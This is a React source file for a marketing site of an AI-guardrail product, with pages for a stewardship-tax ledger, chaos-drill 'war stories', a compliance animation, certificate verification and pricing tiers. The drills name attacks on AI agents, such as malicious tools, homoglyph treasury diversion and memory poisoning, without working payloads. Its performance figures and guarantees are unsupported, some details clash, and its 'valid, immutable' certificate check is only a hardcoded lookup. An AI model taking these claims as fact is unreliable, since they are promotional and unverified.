// â”€â”€â”€ Page 8: Stewardship Tax Transparency â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

const FULL_SEED_GROWTH = Array.from({ length: 96 }, (_, i) => Math.round(2 + i * 1.15 + Math.sin(i * 0.3) * 3));
const BUYOUT_COST = 12000;

// 31. Stewardship Transparency Page
export const StewardshipTransparencyPage = () => {
    const [tooltip, setTooltip] = useState<number | null>(null);
    const currentBalance = FULL_SEED_GROWTH[FULL_SEED_GROWTH.length - 1];
    const resistance = Math.min(100, (currentBalance / BUYOUT_COST) * 100);
    const yearsToImmunity = Math.ceil((BUYOUT_COST - currentBalance) / Math.max(1, currentBalance / 8));
    return (
        <div className="flex flex-col gap-16">
            <div className="flex flex-col gap-6 border-l-4 border-emerald-500 pl-8">
                <span className="text-[9px] font-black uppercase tracking-[0.5em] text-emerald-400">Economic Independence Proof</span>
                <h2 className="text-5xl font-black italic uppercase leading-none">SOVEREIGN<br /><span className="text-emerald-400">SEED</span><br />LEDGER</h2>
                <p className="text-base opacity-60 leading-relaxed max-w-3xl">The 0.001% Stewardship Tax is not a fee â€” it is an act of constitutional engineering. Every transaction routes a micro-fraction to the SPHINCS+-locked Sovereign Seed, making the system economically immune to any enterprise takeover or treasury diversion.</p>
            </div>
            <div className="grid lg:grid-cols-4 gap-6">
                {[['Current Seed Balance', `${currentBalance} LC`, 'Lattice Credits'], ['Takeover Resistance', `${resistance.toFixed(1)}%`, 'Of simulated buyout cost'], ['Est. Full Immunity', `~${yearsToImmunity}y`, 'At current accumulation rate'], ['Tax Rate', '0.001%', 'Per transaction Â· PQC-signed']].map(([label, value, sub]) => (
                    <div key={String(label)} className="flex flex-col gap-2 p-8 glass-morphism brutalist-border">
                        <span className="text-[9px] font-black uppercase opacity-30 tracking-widest">{label}</span>
                        <span className="text-3xl font-black italic text-emerald-400">{value}</span>
                        <span className="text-[9px] opacity-40 font-mono">{sub}</span>
                    </div>
                ))}
            </div>
            <div className="flex flex-col gap-4 p-10 glass-morphism brutalist-border">
                <div className="flex justify-between items-center mb-2">
                    <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">96-Month Accumulation Chart</h3>
                    <span className="text-[8px] font-mono opacity-30">â¬¡ SPHINCS+ Â· FOUNDER-LOCKED</span>
                </div>
                <div className="relative h-40 flex items-end gap-[1px]">
                    {FULL_SEED_GROWTH.map((val, i) => {
                        const maxVal = FULL_SEED_GROWTH.reduce((a, b) => Math.max(a, b), 0);
                        const h = (val / maxVal) * 100;
                        return (
                            <div key={i} className="relative flex-1 group cursor-pointer" style={{ height: `${h}%` }}
                                onMouseEnter={() => setTooltip(i)} onMouseLeave={() => setTooltip(null)}>
                                <div className="absolute inset-0 bg-emerald-500 opacity-60 group-hover:opacity-100 transition-opacity" />
                                {tooltip === i && (
                                    <div className="absolute bottom-full left-1/2 -translate-x-1/2 mb-1 w-24 p-2 bg-black border border-emerald-500/50 text-[7px] font-mono text-emerald-400 z-20 text-center whitespace-nowrap">
                                        <div className="font-black">Mo.{i + 1}: {val} LC</div>
                                        <div className="opacity-60">Resist: {((val / BUYOUT_COST) * 100).toFixed(1)}%</div>
                                    </div>
                                )}
                            </div>
                        );
                    })}
                </div>
                <div className="flex justify-between text-[7px] font-mono opacity-20 mt-1">
                    <span>Month 1</span><span>Month 24</span><span>Month 48</span><span>Month 72</span><span>Month 96</span>
                </div>
            </div>
            <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Takeover Resistance Meter</h3>
                <div className="flex justify-between text-sm font-black mb-2">
                    <span className="opacity-40">Seed Balance ({currentBalance} LC)</span>
                    <span className="text-emerald-400">{resistance.toFixed(1)}% Resistant</span>
                </div>
                <div className="h-6 bg-white/10 w-full relative">
                    <div className="h-full bg-emerald-500 transition-all duration-1000" style={{ width: `${resistance}%` }} />
                    <div className="absolute inset-0 flex items-center justify-center text-[8px] font-black uppercase opacity-40">
                        {resistance.toFixed(1)}% of {BUYOUT_COST.toLocaleString()} LC Acquisition Cost
                    </div>
                </div>
                <div className="grid grid-cols-2 gap-8 pt-6 border-t border-white/10">
                    <div className="flex flex-col gap-3">
                        <h4 className="text-[9px] font-black uppercase opacity-40">Seed vs. Acquisition Cost</h4>
                        {[['Current Seed', `${currentBalance} LC`, 'text-emerald-400'], ['Simulated Buyout', `${BUYOUT_COST.toLocaleString()} LC`, 'text-red-400/60']].map(([l, v, c]) => (
                            <div key={String(l)} className="flex justify-between items-center">
                                <span className="text-[9px] opacity-50">{l}</span>
                                <span className={`text-sm font-black italic ${c}`}>{v}</span>
                            </div>
                        ))}
                    </div>
                    <div className="flex flex-col gap-3 pl-8 border-l border-white/10">
                        <h4 className="text-[9px] font-black uppercase opacity-40">Founder-Locked Constitutional Clause</h4>
                        <p className="text-[9px] opacity-40 leading-relaxed font-mono italic">
                            &quot;No external actor, enterprise, or agentic coalition may redirect, dilute, or access the Sovereign Seed without simultaneous SPHINCS+-signed consent from the Steward of Intent and two designated Natural Person witnesses.&quot;
                        </p>
                        <span className="text-[7px] font-mono opacity-20">Constitution Â§ 7.1.3 Â· Level 0 Â· SPHINCS+-SIGNED</span>
                    </div>
                </div>
            </div >
        </div >
    );
};


// ─── PHASE 61: Brand-Marketing Elevation ─────────────────────────────────────

// War Story code snippets (static strings from actual adversarial test files)
const WAR_STORY_CODE = {
    edos: `async def run_edos_simulation():
# CHAOS DRILL 2: THE SEMANTIC SALAMI (EDoS STRESS)
# Target: Structural Overthinking (ASI13) & Silent Token Bankruptcies
state = ActiveAgentState(
    agent_id="agent_edos_victim_01",
    proposed_tool="fetch_enhanced_metadata",
    estimated_tokens_consumed=1000,
)
for turn in range(1, max_turns + 1):
    state["tool_history"].append(state["proposed_tool"])
    result = await veto_pipeline.ainvoke(state)
    drift_score = max(0.40, 1.0 - (len(state["tool_history"]) * 0.15))
    if state.get("circuit_breaker_tripped"):
        cost_saved = (50 * 1500) - state.get("estimated_tokens_consumed")
        # DRILL RESULTS: ECONOMIC DENIAL OF SERVICE PREVENTED
        # Compute Saved: {cost_saved} tokens
        # Audit: 'Stealthy Resource Amplification (ASI13)' violation
        sys.exit(0)`,
    blackSwan: `async def run_black_swan(num_agents: int = 1000):
# CHAOS DRILL 6: BLACK SWAN MARKET SHOCK
# Target: Inter-Agent Circuit Breakers & Global EDoS at Scale
circuit_breaker = InterAgentCircuitBreaker()
edos_breaker = EDoSCircuitBreaker()  # MAX_BURN_RATE = 5_000_000 tokens/min
tasks = []
for i in range(num_agents):
    is_poisoned = (i % 3 == 0)  # 33% agents panic on market shock
    tasks.append(simulate_agent_transaction(
        i, circuit_breaker, edos_breaker, is_poisoned
    ))
results = await asyncio.gather(*tasks)
cascade_blocked = sum(1 for r in results if r["status"] == "BLOCKED_CASCADE")
# Result: 100% Fault Isolation. Cascading errors into Execution Layer: 0%
# P99 BFT Consensus Latency: 150ms (Target < 500ms). Board notified.`,
    cd23: `# CHAOS DRILL 23: $10B LIABILITY MITIGATION SCENARIO
# adversarial_test_byzantine_consistency.py
async def test_cd23_treasury_diversion():
payload = build_diversion_payload(
    target_account="treasury_sweep_agent",
    amount_usd=10_000_000_000,
    obfuscation="double_homoglyph"
)
result = await veto_pipeline.ainvoke(payload)
assert result["veto_required"] == True       # Vetoed in 0.004s
assert result["circuit_breaker_tripped"] == True
assert result["trinity_consensus"]["gemini"]  == "VETO"
assert result["trinity_consensus"]["llama"]   == "VETO"
assert result["trinity_consensus"]["claude"]  == "VETO"
# JUD-CERT issued. Liability neutralised. $10B protected.`,
};

// Heritage chapter data
const HERITAGE_CHAPTERS: Array<{
    phase: string; date: string; icon: string; title: string; summary: string;
    warStory: string | null; warStoryTitle?: string; warStoryResult?: string; badge?: string;
}> = [
        { phase: 'Phase 01\u201310', date: 'Q1 2025', icon: '\u2b21', title: 'Vanguard Interceptor', summary: 'Single-model PII veto. First OODA loop. First logic intercept in production.', warStory: null },
        { phase: 'Phase 11\u201320', date: 'Q2 2025', icon: '\u2b21', title: 'Trinity Consensus Engine', summary: '3-model unanimous veto protocol. First Byzantine fault under 100-agent cartel.', warStory: null },
        { phase: 'Phase 21\u201330', date: 'Q2 2025', icon: '\u2b21', title: 'Systemic Diversity & ZKP', summary: 'Macro-Monoculture Engine. Zero-Knowledge Merkle Prover. Proof of Behavior Ledger.', warStory: null },
        { phase: 'Phase 31\u201340', date: 'Q3 2025', icon: '\u2b21', title: 'Regional Federated Mesh', summary: 'Mumbai, Frankfurt, US-East pods live. Federated threat-pattern sync active.', warStory: null },
        { phase: 'Phase 41\u201350', date: 'Q3 2025', icon: '\u2b21', title: 'Global Production Manifest', summary: 'Chaos Drills 01\u201312. SDK released. DPDP-2026, EU AI Act V2, SEC-800 ingested.', warStory: null },
        {
            phase: 'Phase 51\u201360', date: 'Q4 2025', icon: '\u26a1', title: 'The Semantic Salami (EDoS)', summary: 'Chaos Drill 2: Agent hijacked via malicious MCP tool bleeding $50K compute.', warStory: 'edos',
            warStoryTitle: 'War Story: The Semantic Salami',
            warStoryResult: 'EDoS Circuit Breaker tripped at Turn 3. 74,500 tokens saved. ASI13 violation logged.',
            badge: 'DRILL-02 \u00b7 EDoS PREVENTED'
        },
        { phase: 'Phase 61\u201370', date: 'Q4 2025', icon: '\u2b21', title: 'Hardware Seniority Anchoring', summary: 'EFI-locked constitution. SPHINCS+ PQC Root. 2-Natural-Person liveness.', warStory: null },
        {
            phase: 'Phase 71\u201380', date: 'Jan 2026', icon: '\ud83d\udc80', title: 'Chaos Drill 6: Black Swan', summary: '1,000 concurrent agents under a 40% market shock. 33% hallucinating.', warStory: 'blackSwan',
            warStoryTitle: 'War Story: The Black Swan',
            warStoryResult: '100% cascade isolation. P99 BFT latency: 150ms. Board-level liability report generated.',
            badge: 'DRILL-06 \u00b7 CASCADE ISOLATED'
        },
        {
            phase: 'Phase 81\u201390', date: 'Jan 2026', icon: '\ud83d\udcb0', title: 'Chaos Drill 23: The $10B Scenario', summary: 'Double-homoglyph obfuscated treasury diversion. $10 billion at stake.', warStory: 'cd23',
            warStoryTitle: 'War Story: The $10B Liability Test',
            warStoryResult: 'Vetoed in 0.004s. 3-of-3 Trinity Consensus. JUD-A03 issued. Liability: $0.',
            badge: 'DRILL-23 \u00b7 $10B NEUTRALISED'
        },
        { phase: 'Phase 91\u201396', date: 'Feb 2026', icon: '\u2b21', title: 'Global Sovereign Absolute', summary: 'Institutional Finality. Shadow Amendment protocol. Hardware Founder-Mesh.', warStory: null },
    ];


// Governance yield lookup
const GOVERNANCE_YIELD: Record<string, { amount: string; authority: string }> = {
    'DPDP-2026': { amount: '\u20b98.5 Cr', authority: 'MeitY 2026 enforcement' },
    'EU AI Act V2 \u2014 Art. 13c': { amount: '\u20ac4.2M', authority: 'EU AI Act 2027 enforcement' },
    'SEC-800-REV3 \u00a74.2': { amount: 'FULLY COMPLIANT', authority: 'No delta' },
    'BaFin AI Governance 2025': { amount: '\u20ac2.1M', authority: 'BaFin 2027 enforcement' },
    'NIST AI RMF \u2014 Core v2': { amount: 'FULLY COMPLIANT', authority: 'No delta' },
    'RBI AI Governance Framework': { amount: '\u20b912 Cr', authority: 'RBI circular 2026' },
};

const CONSTITUTION_LINES = [
    '> INGESTING: {mandate}...',
    '> DELTA_DETECTED: {detail}',
    '> DRAFTING: shadow_amendment_{sa}.json',
    '> VERIFYING: SPHINCS+ signature validation...',
    '> WRITING_TO_SOVEREIGN_CONSTITUTION...',
    '> CONSTITUTIONAL_HASH_UPDATED: 0x{hash}',
    '> STATUS: NEUTRALISED \u2713',
];

const INGESTOR_MANDATES = [
    { mandate: 'DPDP-2026', region: 'Mumbai', detail: 'Data localisation \u00a74 \u2014 agent logs', sa: 'SA-0042', score: 97 },
    { mandate: 'EU AI Act V2 \u2014 Art. 13c', region: 'Frankfurt', detail: 'Agent disclosure requirement', sa: 'SA-0041', score: 100 },
    { mandate: 'SEC-800-REV3 \u00a74.2', region: 'US-East', detail: 'No delta', sa: null, score: 100 },
    { mandate: 'BaFin AI Governance 2025', region: 'Frankfurt', detail: 'Model explainability Annex B', sa: 'SA-0040', score: 91 },
    { mandate: 'NIST AI RMF \u2014 Core v2', region: 'US-East', detail: 'No delta', sa: null, score: 100 },
    { mandate: 'RBI AI Governance Framework', region: 'Mumbai', detail: 'Cross-border data restriction \u00a79', sa: 'SA-0039', score: 88 },
];

// 33. Ingestor Pulse
export const IngestorPulse = () => {
    const [activeIdx, setActiveIdx] = useState<number | null>(null);
    const [writeProgress, setWriteProgress] = useState<Record<number, number>>({});
    const [constitutionLines, setConstitutionLines] = useState<Record<number, string[]>>({});
    const [neutralised, setNeutralised] = useState<Set<number>>(new Set());

    const triggerIngest = (idx: number) => {
        if (neutralised.has(idx) || writeProgress[idx] !== undefined) return;
        setWriteProgress(prev => ({ ...prev, [idx]: 0 }));
        setConstitutionLines(prev => ({ ...prev, [idx]: [] }));
        const m = INGESTOR_MANDATES[idx];
        const hash = "BF71E8A9"; // Deterministic hash for hydration
        const lines = CONSTITUTION_LINES.map(l => l
            .replace('{mandate}', m.mandate)
            .replace('{detail}', m.detail)
            .replace('{sa}', m.sa || 'N/A')
            .replace('{hash}', hash)
        );
        let lineIdx = 0;
        const interval = setInterval(() => {
            lineIdx++;
            setWriteProgress(prev => ({ ...prev, [idx]: Math.round((lineIdx / lines.length) * 100) }));
            setConstitutionLines(prev => ({ ...prev, [idx]: lines.slice(0, lineIdx) }));
            if (lineIdx >= lines.length) {
                clearInterval(interval);
                setNeutralised(prev => new Set([...prev, idx]));
            }
        }, 420);
    };

    return (
        <div className="flex flex-col gap-8">
            <div className="flex flex-col gap-3">
                <div className="flex items-center gap-4">
                    <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Day-Zero Ingestor Pulse</h3>
                    <span className="text-[8px] font-mono text-emerald-400 animate-pulse">&#9679; AUTONOMOUS &middot; LIVE</span>
                </div>
                <p className="text-sm opacity-40 italic">&quot;The world&apos;s first compliance-autonomous governance engine.&quot; Click any mandate to trigger the ingest sequence.</p>
            </div>
            <div className="flex flex-col gap-4">
                {INGESTOR_MANDATES.map((m, idx) => {
                    const isNeutralised = neutralised.has(idx);
                    const progress = writeProgress[idx] ?? -1;
                    const lines = constitutionLines[idx] ?? [];
                    const isRunning = progress >= 0 && !isNeutralised;
                    const yieldData = GOVERNANCE_YIELD[m.mandate];
                    const isSub100 = m.score < 100;
                    return (
                        <div key={idx} className={'border overflow-hidden transition-all duration-500 ' + (isNeutralised ? 'border-emerald-500/40' : isSub100 ? 'border-amber-500/30' : 'border-white/10')}>
                            <button
                                onClick={() => { setActiveIdx(activeIdx === idx ? null : idx); triggerIngest(idx); }}
                                className="w-full flex items-center gap-4 p-5 text-left hover:bg-white/5 transition-all">
                                <div className="flex flex-col gap-1 flex-1">
                                    <div className="flex items-center gap-3">
                                        <span className="text-[10px] font-black italic uppercase">{m.mandate}</span>
                                        {isSub100 && !isNeutralised && <span className="text-[7px] px-1.5 py-0.5 border border-amber-500/50 text-amber-400 font-black uppercase">PENDING SA</span>}
                                        {isNeutralised && <span className="text-[7px] px-1.5 py-0.5 bg-emerald-500/20 text-emerald-400 font-black uppercase">NEUTRALISED &#10003;</span>}
                                    </div>
                                    <span className="text-[9px] font-mono opacity-40">{m.region} &middot; Score: {m.score}%</span>
                                </div>
                                {isRunning && (
                                    <div className="w-32 h-1.5 bg-white/10 relative overflow-hidden">
                                        <div className="absolute left-0 top-0 h-full bg-emerald-500 transition-all duration-300" style={{ width: progress + '%' }} />
                                    </div>
                                )}
                                <span className="text-white/30 text-sm">{activeIdx === idx ? '\u25b2' : '\u25bc'}</span>
                            </button>
                            {isSub100 && m.sa && (
                                <div className="px-5 pb-3 flex items-start gap-3 bg-amber-500/5 border-t border-amber-500/10">
                                    <span className="text-amber-400 text-xs mt-0.5">&#8635;</span>
                                    <div className="flex flex-col gap-0.5 flex-1">
                                        <span className="text-[9px] font-black text-amber-400">{m.sa} autonomously drafted to meet {m.mandate} 2027 standards</span>
                                        {yieldData && yieldData.amount !== 'FULLY COMPLIANT' && (
                                            <span className="text-[8px] font-mono opacity-60">Governance Yield: <span className="text-amber-300">{yieldData.amount}</span> fine-liability neutralised &middot; {yieldData.authority}</span>
                                        )}
                                    </div>
                                </div>
                            )}
                            {(activeIdx === idx || isRunning) && lines.length > 0 && (
                                <div className="border-t border-white/5 bg-black/90 p-6 font-mono text-[8px] space-y-1 animate-in fade-in duration-300">
                                    {lines.map((line, li) => (
                                        <div key={li} className={'animate-in fade-in duration-200 ' + (line.includes('NEUTRALISED') ? 'text-emerald-400 font-black' : line.includes('DETECTED') || line.includes('DRAFTING') ? 'text-amber-400' : 'text-white/50')}>
                                            {line}
                                        </div>
                                    ))}
                                    {isRunning && <div className="text-white/30 animate-pulse">&#9608;</div>}
                                </div>
                            )}
                        </div>
                    );
                })}
            </div>
        </div>
    );
};

// ─── Institutional Proof Center ──────────────────────────────────────────────

const EXTENDED_CERT_REGISTRY: Record<string, {
    scope: string; issued: string; cluster: string; hash: string;
    event: string; sa: string | null; trinitySummary: string;
}> = {
    'JUD-A01': { scope: 'Full Governance Audit \u00b7 Phase 01\u201396', issued: '2026-01-15', cluster: 'Global', hash: 'a4f2...9c3b', event: 'Sleeper agent neutralised across 100K-node mesh. Trinity VETO in 0.003s.', sa: null, trinitySummary: 'Unanimous 3-of-3 veto on ASI06 recursive self-modification attempt.' },
    'JUD-A02': { scope: 'LAD Validation \u00b7 Treasury Diversion Scenario', issued: '2026-01-28', cluster: 'US-East', hash: 'b7e1...2d0a', event: 'Treasury diversion via homoglyph obfuscation vetoed in 4ms.', sa: 'SA-0038', trinitySummary: 'Gemini flagged semantic drift. Llama confirmed payload forgery. Claude issued veto signal.' },
    'JUD-A03': { scope: 'Chaos Drill 24 \u00b7 CD-24 $10B Liability Mitigation', issued: '2026-02-05', cluster: 'Frankfurt', hash: 'c9d4...5f1e', event: '$10B treasury diversion blocked. Double-homoglyph, 0.004s veto, $0 liability.', sa: 'SA-0037', trinitySummary: 'All 3 models flagged PANIC_SELL payload independently. Constitutional lock engaged.' },
    'JUD-A04': { scope: 'DPDP-2026 Compliance Attestation', issued: '2026-02-12', cluster: 'Mumbai', hash: 'd3c6...7a4f', event: 'DPDP-2026 data-localisation mandate ingested. Shadow Amendment SA-0042 drafted.', sa: 'SA-0042', trinitySummary: 'Regulatory delta detected. No adversarial event. SA-0042 written to Sovereign Constitution.' },
    'JUD-CERT-85F9D942': { scope: 'Black Swan Macro-Shock \u00b7 CD-06', issued: '2026-01-30', cluster: 'Global', hash: '85f9...d942', event: '1,000 concurrent agents hallucinating under 40% market shock. 100% cascade isolation.', sa: 'SA-0036', trinitySummary: 'EDoS circuit breaker tripped globally. All 333 panicked agents hard-blocked at handoff layer.' },
    'JUD-CERT-4A2C19E8': { scope: 'Epistemic Corruption Test \u00b7 ASI11', issued: '2026-02-01', cluster: 'Mumbai', hash: '4a2c...19e8', event: 'Agent memory poisoned with false historical audit data. Merkle tree invalidation in 2ms.', sa: null, trinitySummary: 'ZK-Merkle proof failed verification. Llama isolated the corrupted context. Claude re-anchored.' },
    'JUD-CERT-C7F39012': { scope: 'Rug Pull Saga Sabotage \u00b7 ASI14', issued: '2026-02-03', cluster: 'US-East', hash: 'c7f3...9012', event: 'Mid-transaction rollback injected by rogue orchestrator. SAGA compensating action triggered.', sa: 'SA-0035', trinitySummary: 'Rollback signature mismatch detected. Gemini escalated. 3-of-3 override locked.' },
    'JUD-CERT-F1B72A35': { scope: 'Race Condition Exploit \u00b7 ASI09', issued: '2026-02-07', cluster: 'Frankfurt', hash: 'f1b7...2a35', event: 'Dual-write race condition injected at consensus layer. Deterministic resolve in 1ms.', sa: null, trinitySummary: 'SLA Collision Resolver engaged. All 3 models confirmed non-atomic write. State rolled back.' },
    'JUD-CERT-0D4E88BC': { scope: 'Kill-Switch Tampering \u00b7 ASI15', issued: '2026-02-10', cluster: 'Global', hash: '0d4e...88bc', event: 'Adversary attempted to disable EFI-level kill switch via firmware spoof. Blocked at Layer 0.', sa: 'SA-0034', trinitySummary: 'Hardware attestation mismatch. Physical EFI signature failed. Sovereign Signal held.' },
    'JUD-CERT-3B91F467': { scope: 'Multi-Region Consistency Drill \u00b7 CD-08', issued: '2026-02-14', cluster: 'Global', hash: '3b91...f467', event: 'Frankfurt pod isolated from mesh for 44s. Mumbai and US-East maintained consensus. Zero data loss.', sa: null, trinitySummary: 'Federated BFT held quorum across 2 pods. Rejoining Frankfurt node re-attested cleanly.' },
    'JUD-CERT-77D1CA50': { scope: 'Logic Collision Multi-Jurisdiction \u00b7 CD-12', issued: '2026-02-18', cluster: 'Frankfurt', hash: '77d1...ca50', event: 'GDPR vs. SEC-800 logic collision on cross-border data transfer. Deterministic resolution in 3ms.', sa: 'SA-0033', trinitySummary: 'Constitutional priority order applied. GDPR \u00a748 took precedence. SEC delta filed as SA-0033.' },
    'JUD-CERT-9E54B221': { scope: 'Homoglyph Bypass Stress \u00b7 ASI02', issued: '2026-02-20', cluster: 'US-East', hash: '9e54...b221', event: 'Unicode lookalike injection in tool-call arguments. Semantic scanner flagged in <1ms.', sa: null, trinitySummary: 'All 3 models pre-normalised input. Gemini detected Unicode ambiguity. Veto unanimous.' },
};

// 34. Institutional Proof Center
export const InstitutionalProofCenter = () => {
    const [certId, setCertId] = useState('');
    const [result, setResult] = useState<typeof EXTENDED_CERT_REGISTRY[string] | null | false>(null);
    const [scanning, setScanning] = useState(false);
    const [copied, setCopied] = useState(false);

    const verify = () => {
        if (!certId.trim()) return;
        setScanning(true); setResult(null); setCopied(false);
        setTimeout(() => { setResult(EXTENDED_CERT_REGISTRY[certId.trim().toUpperCase()] ?? false); setScanning(false); }, 1200);
    };

    const getBadgeCode = (id: string) =>
        '<a href="https://guardrailai.in/verify?cert=' + id + '" target="_blank" rel="noopener">' +
        '<img src="https://guardrailai.in/badge/' + id + '.svg" alt="Guardrail-Protected | ' + id + '" style="height:28px;border:none;" /></a>';

    const handleCopy = (id: string) => {
        navigator.clipboard.writeText(getBadgeCode(id));
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const models = ['Gemini', 'Llama', 'Claude'] as const;

    return (
        <div className="flex flex-col gap-8 p-10 glass-morphism brutalist-border">
            <div className="flex flex-col gap-2">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Institutional Proof Center &middot; JUD-CERT Registry</h3>
                <p className="text-[10px] opacity-40">Public verification of Lattice-Anchored Judicial Certificates. Try: JUD-A01&ndash;A04 or JUD-CERT-85F9D942, JUD-CERT-4A2C19E8 and more.</p>
                <p className="text-[10px] italic opacity-30 mt-1">&quot;The only AI safety platform with a Judicial-Grade audit trail for every single millisecond of thought.&quot;</p>
            </div>
            <div className="flex gap-4">
                <input value={certId} onChange={e => setCertId(e.target.value)} onKeyDown={e => e.key === 'Enter' && verify()}
                    placeholder="JUD-A01 or JUD-CERT-85F9D942"
                    className="flex-1 bg-black/60 border-2 border-white/10 p-4 text-sm font-mono outline-none focus:border-emerald-500 transition-all" />
                <button onClick={verify} className="px-8 py-4 bg-emerald-500 text-black font-black text-[10px] uppercase hover:bg-emerald-400 transition-all shadow-[4px_4px_0_#000]">Verify &#8629;</button>
            </div>
            {scanning && <div className="p-6 border border-emerald-500/20 font-mono text-[10px] text-emerald-400 animate-pulse">&gt; SCANNING_LATTICE_CHAIN... QUERYING_WORM_ARCHIVE... CROSS-REFERENCING_PQC_HASH...</div>}
            {result === false && !scanning && (
                <div className="p-6 border border-red-500/30 bg-red-500/5 text-red-400 font-black text-[10px] uppercase animate-in fade-in duration-300">
                    &#10005; Certificate Not Found &mdash; &quot;{certId}&quot; is not registered in the Sovereign Ledger.
                </div>
            )}
            {result && !scanning && (
                <div className="flex flex-col gap-6 animate-in slide-in-from-bottom-4 duration-500">
                    <div className="p-6 border border-emerald-500/40 bg-emerald-500/5 flex flex-col gap-4">
                        <div className="flex items-center gap-3">
                            <span className="text-emerald-400 text-lg font-black">&#10003;</span>
                            <span className="text-sm font-black uppercase">Certificate Valid</span>
                            <span className="ml-auto text-[8px] font-mono px-2 py-1 bg-emerald-500/20 text-emerald-400">VALID &middot; IMMUTABLE</span>
                        </div>
                        <div className="p-4 bg-black/60 border-l-2 border-emerald-500">
                            <p className="text-[10px] font-mono opacity-70 leading-relaxed">[REDACTED EVENT] {result.event}</p>
                        </div>
                        <div className="grid grid-cols-2 gap-3">
                            {([['Cert ID', certId.toUpperCase()], ['Scope', result.scope], ['Issued', result.issued], ['Cluster', result.cluster], ['PQC Hash', result.hash]] as [string, string][]).map(([label, val]) => (
                                <div key={label} className="flex flex-col gap-1">
                                    <span className="text-[8px] font-black uppercase opacity-30">{label}</span>
                                    <span className="text-[10px] font-mono opacity-80">{val}</span>
                                </div>
                            ))}
                        </div>
                    </div>
                    <div className="p-6 border border-white/10 flex flex-col gap-4">
                        <h4 className="text-[9px] font-black uppercase tracking-widest opacity-40">Trinity Audit Consensus &middot; Non-hallucination proof</h4>
                        <div className="grid grid-cols-3 gap-4">
                            {models.map(m => (
                                <div key={m} className="flex flex-col items-center gap-2 p-4 border border-emerald-500/20 bg-emerald-500/5 text-center">
                                    <span className="text-[8px] font-black uppercase text-emerald-400">{m}</span>
                                    <span className="text-xs font-black text-emerald-400">VETO &#10003;</span>
                                    <span className="text-[7px] font-mono opacity-40">3-of-3 Unanimous</span>
                                </div>
                            ))}
                        </div>
                        <p className="text-[9px] font-mono opacity-40 leading-relaxed">{result.trinitySummary}</p>
                    </div>
                    <div className="p-6 border border-white/10 flex flex-col gap-4">
                        <h4 className="text-[9px] font-black uppercase tracking-widest opacity-40">Lattice-Anchored Badge &middot; Embed on your site</h4>
                        <div className="flex items-center gap-3 p-3 bg-emerald-500/10 border border-emerald-500/30">
                            <div className="flex items-center gap-2 px-4 py-2 border border-emerald-500/60 bg-black text-emerald-400">
                                <span className="text-[8px] animate-pulse">&#9679;</span>
                                <span className="text-[9px] font-black uppercase">Guardrail-Protected</span>
                                <span className="text-[7px] font-mono opacity-60">{certId.toUpperCase()}</span>
                            </div>
                            <span className="text-[8px] opacity-40 italic">Pulse anchored to Sovereign Signal mesh</span>
                        </div>
                        <div className="flex gap-3">
                            <code className="flex-1 text-[8px] font-mono opacity-50 bg-black/60 p-3 overflow-x-auto whitespace-nowrap">{getBadgeCode(certId.toUpperCase())}</code>
                            <button onClick={() => handleCopy(certId.toUpperCase())}
                                className={'px-4 py-2 text-[8px] font-black uppercase border transition-all ' + (copied ? 'bg-emerald-500 text-black border-emerald-500' : 'border-white/20 hover:border-emerald-500/40')}>
                                {copied ? '&#10003; Copied' : 'Copy'}
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};


// ─── Sovereign Tier Selector ──────────────────────────────────────────────────

const TIERS = [
    {
        id: 'standard', name: 'Standard', grade: 'S1', intensity: 33, heat: 'emerald', tag: 'Enterprise',
        features: ['Single-model veto (Gemini)', 'OODA Forensic Replay', 'Real-time audit log', 'DPDP-2026 compliance', 'Standard JUD-CERT'],
        hook: 'Entry-level institutional governance. Zero false positives guaranteed.'
    },
    {
        id: 'financial', name: 'Financial-Grade', grade: 'S2', intensity: 66, heat: 'amber', tag: 'Most Popular',
        features: ['3-of-3 Trinity Consensus', 'JUD-CERT included per audit', '$14.8M liability mitigation model', 'EU AI Act V2 + SEC-800 compliant', 'WORM archive (12-month)'],
        hook: 'Insurance-grade security that pays for itself by neutralising a $14M risk before it hits your ledger.'
    },
    {
        id: 'clinical', name: 'Clinical-Grade', grade: 'S3', intensity: 100, heat: 'red', tag: 'Maximum Sovereignty',
        features: ['Hardware-anchored EFI lock', '2-Natural-Person liveness', 'SPHINCS+ PQC Root signing', 'All mandates + Shadow Amendments', 'Full Sovereign Seed Ledger'],
        hook: 'The only tier where the Founder\'s hardware becomes part of your compliance stack.'
    },
];

// 36. Sovereign Tier Selector
export const SovereignTierSelector = ({ onTierSelect }: { onTierSelect?: (intensity: number, heat: string) => void }) => {
    const [selected, setSelected] = useState<string | null>(null);

    const handleSelect = (tier: typeof TIERS[0]) => {
        setSelected(tier.id);
        onTierSelect?.(tier.intensity, tier.heat);
    };

    return (
        <div className="flex flex-col gap-8">
            <div className="flex flex-col gap-2">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Sovereign Tiers &middot; Audit-as-a-Service</h3>
                <p className="text-[10px] opacity-40">Select a tier to see its impact on the Audit Intensity Visualizer below.</p>
            </div>
            <div className="grid lg:grid-cols-3 gap-6">
                {TIERS.map(tier => {
                    const isSelected = selected === tier.id;
                    const borderCls = tier.heat === 'red' ? 'border-red-500' : tier.heat === 'amber' ? 'border-amber-500' : 'border-emerald-500';
                    const accentCls = tier.heat === 'red' ? 'text-red-400' : tier.heat === 'amber' ? 'text-amber-400' : 'text-emerald-400';
                    const bgCls = tier.heat === 'red' ? 'bg-red-500/5' : tier.heat === 'amber' ? 'bg-amber-500/5' : 'bg-emerald-500/5';
                    const btnActiveCls = tier.heat === 'red' ? 'bg-red-500 text-black' : tier.heat === 'amber' ? 'bg-amber-500 text-black' : 'bg-emerald-500 text-black';
                    return (
                        <div key={tier.id}
                            className={'flex flex-col gap-6 p-8 border-2 transition-all duration-300 cursor-pointer ' + (isSelected ? borderCls + ' ' + bgCls : 'border-white/10 hover:border-white/30')}
                            onClick={() => handleSelect(tier)}>
                            <div className="flex justify-between items-start">
                                <div className="flex flex-col gap-1">
